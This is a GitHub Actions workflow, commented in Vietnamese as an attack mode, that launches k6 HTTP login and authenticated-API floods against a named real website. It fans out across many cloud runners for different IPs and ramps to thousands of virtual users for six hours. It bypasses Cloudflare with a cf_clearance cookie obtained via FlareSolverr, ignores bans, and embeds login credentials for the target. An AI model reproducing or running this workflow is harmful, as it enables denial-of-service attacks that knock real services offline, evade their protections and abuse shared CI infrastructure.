name: HTTP Flood — thanhhuyreal

on:
  workflow_dispatch:
    inputs:
      mode:
        description: 'Che do tan cong'
        required: true
        default: 'login_flood'
        type: choice
        options:
          - login_flood      # Login flood qua Cloudflare (cf_clearance bypass)
          - auth_api_flood   # Login 1 lan, roi flood authenticated API (nang hon)
      runners:
        description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
        required: true
        default: '5'
      max_vus:
        description: 'Max VUs moi runner'
        required: false
        default: '2000'
      stages:
        description: 'Stages override (de trong = dung mac dinh)'
        required: false
        default: ''
      cf_clearance:
        description: 'cf_clearance cookie (lay tu FlareSolverr - expire ~30 phut)'
        required: true
        default: ''
      cf_ua:
        description: 'User-Agent phai khop voi luc lay cf_clearance'
        required: false
        default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36'
      php_identifier:
        description: 'Login username/email'
        required: false
        default: 'lonussystem'
      php_password:
        description: 'Login password'
        required: false
        default: 'lonussystem123@'

jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          COUNT=${{ github.event.inputs.runners }}
          MATRIX=$(python3 -c "import json; print(json.dumps(list(range(1, int('$COUNT')+1))))")
          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT

  flood:
    needs: prepare
    name: "[${{ github.event.inputs.mode }}] Runner ${{ matrix.runner }}"
    runs-on: ubuntu-latest
    timeout-minutes: 360
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        runner: ${{ fromJson(needs.prepare.outputs.matrix) }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup k6 (native)
        uses: grafana/setup-k6-action@v1

      - name: Tang ulimit
        run: ulimit -n 131072 || true

      - name: Runner info
        run: |
          echo "Mode    : ${{ github.event.inputs.mode }}"
          echo "Runner  : ${{ matrix.runner }}"
          echo "IP      : $(curl -sf https://api.ipify.org || echo unknown)"
          echo "CPU     : $(nproc) cores"
          echo "RAM     : $(free -m | awk '/Mem:/{print $4}') MB free"

      # ─────────────────────────────────────────────────────────────
      # MODE: login_flood — Login flood qua Cloudflare với cf_clearance
      # ─────────────────────────────────────────────────────────────
      - name: "[login_flood] Cloudflare bypass + Login flood"
        if: ${{ github.event.inputs.mode == 'login_flood' }}
        env:
          PHP_BASE_URL:     "https://thanhhuyreal.com"
          PHP_LOGIN_PAGE:   "/?auth=login"
          PHP_LOGIN_PATH:   "/model/login"
          PHP_IDENTIFIER:   ${{ github.event.inputs.php_identifier }}
          PHP_PASSWORD:     ${{ github.event.inputs.php_password }}
          CF_CLEARANCE:     ${{ github.event.inputs.cf_clearance }}
          CF_UA:            ${{ github.event.inputs.cf_ua }}
          PHP_FRESH_SESSION: "true"
          STAGES:           ${{ github.event.inputs.stages || '30s:50,60s:200,60s:500,360m:500' }}
          START_RATE:       "20"
          PRE_VUS:          "100"
          MAX_VUS:          ${{ github.event.inputs.max_vus || '2000' }}
          REQUEST_TIMEOUT:  "20s"
          REQUEST_DELAY:    "0"
          MAX_5XX_RATE:     "0.9"
          MAX_TIMEOUT_RATE: "0.9"
          ABORT_ON_BAN:     "false"
        run: |
          ulimit -n 131072 || true
          if [ -z "$CF_CLEARANCE" ]; then
            echo "ERROR: cf_clearance is required! Get it from FlareSolverr."
            exit 1
          fi
          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:20}... (${#CF_CLEARANCE} chars)"
          echo "Starting login flood attack..."
          k6 run --no-usage-report sites/thanhhuyreal/test-script-login.js

      # ─────────────────────────────────────────────────────────────
      # MODE: auth_api_flood — Login 1 lần, sau đó flood authenticated API
      # ─────────────────────────────────────────────────────────────
      - name: "[auth_api_flood] Login once, then flood API endpoints"
        if: ${{ github.event.inputs.mode == 'auth_api_flood' }}
        env:
          IP_URL:           "https://thanhhuyreal.com"
          SITE_HOST:        "thanhhuyreal.com"
          PHP_IDENTIFIER:   ${{ github.event.inputs.php_identifier }}
          PHP_PASSWORD:     ${{ github.event.inputs.php_password }}
          CF_CLEARANCE:     ${{ github.event.inputs.cf_clearance }}
          CF_UA:            ${{ github.event.inputs.cf_ua }}
          STAGES:           ${{ github.event.inputs.stages || '30s:200,60s:1000,60s:3000,360m:3000' }}
          START_RATE:       "50"
          PRE_VUS:          "300"
          MAX_VUS:          ${{ github.event.inputs.max_vus || '5000' }}
          REQUEST_TIMEOUT:  "30s"
          MAX_ERR_RATE:     "0.9"
        run: |
          ulimit -n 131072 || true
          if [ -z "$CF_CLEARANCE" ]; then
            echo "ERROR: cf_clearance is required! Get it from FlareSolverr."
            exit 1
          fi
          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:20}... (${#CF_CLEARANCE} chars)"
          echo "Starting authenticated API flood..."
          k6 run --no-usage-report sites/thanhhuyreal/test-script-auth.js

      - name: Upload results (if failed)
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: k6-results-runner-${{ matrix.runner }}
          path: |
            /tmp/k6-*.log
          retention-days: 7
